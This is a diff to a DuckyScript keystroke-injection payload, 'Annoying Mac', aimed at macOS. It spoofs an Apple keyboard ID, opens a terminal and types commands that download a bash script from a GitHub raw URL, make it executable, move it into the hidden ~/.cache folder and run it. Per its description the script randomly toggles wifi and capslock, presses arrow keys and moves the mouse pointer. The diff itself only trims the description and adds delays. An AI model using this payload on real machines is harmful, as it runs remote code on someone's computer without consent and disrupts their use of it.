@@ -1,7 +1,7 @@
 REM TITLE: Annoying Mac
 REM AUTHOR: jest (adapted from OSINTI4L's [Annoying Linux](https://github.com/OSINTI4L/DuckyScript-Payloads/tree/main/Payloads/Annoying_Linux))
 REM TARGET OS: MacOS
-REM DESCRIPTION: An annoying payload that utilizes ducky/bash scripts to randomly turn on and off: wifi, capslock, numlock, press arrow keys, and teleports the mouse pointer around the screen.
+REM DESCRIPTION: An annoying payload that utilizes ducky/bash scripts to randomly turn on and off: wifi, capslock, press arrow keys, and teleports the mouse pointer around the screen.
 
 REM Opening terminal:
 ID 05ac:021e Apple:Keyboard
@@ -17,7 +17,9 @@ REM Downloading annoying_mac.sh script, giving execution permissions, and then e
 STRING wget https://raw.githubusercontent.com/jestlandia/DuckyScript-Payloads/refs/heads/main/Payloads/Annoying_Mac/annoying_mac.sh
 DELAY 1000
 STRING chmod +x annoying_mac.sh
+DELAY 100
 STRING mv annoying_mac.sh ~/.cache/
+DELAY 100
 STRING ~/.cache/annoying_mac.sh
 DELAY 100
 ENTER
